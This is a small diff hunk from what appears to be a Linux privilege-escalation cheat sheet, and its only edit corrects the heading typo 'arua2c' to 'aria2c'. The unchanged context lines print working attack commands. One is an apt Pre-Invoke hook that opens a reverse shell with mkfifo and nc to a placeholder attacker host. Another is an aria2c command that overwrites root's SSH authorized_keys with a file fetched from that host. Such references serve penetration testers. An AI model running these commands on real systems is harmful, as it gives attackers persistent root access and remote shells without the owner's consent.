@@ -3362,7 +3362,7 @@ sudo /usr/sbin/apache2 -f <FILE>
 echo 'apt::Update::Pre-Invoke \{"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f"};' > /etc/apt/apt.conf.d/<FILE>
 ```
 
-##### arua2c
+##### aria2c
 
 ```python
 aria2c -d /root/.ssh/ -o authorized_keys "http://<LHOST>/authorized_keys" --allow-overwrite=true
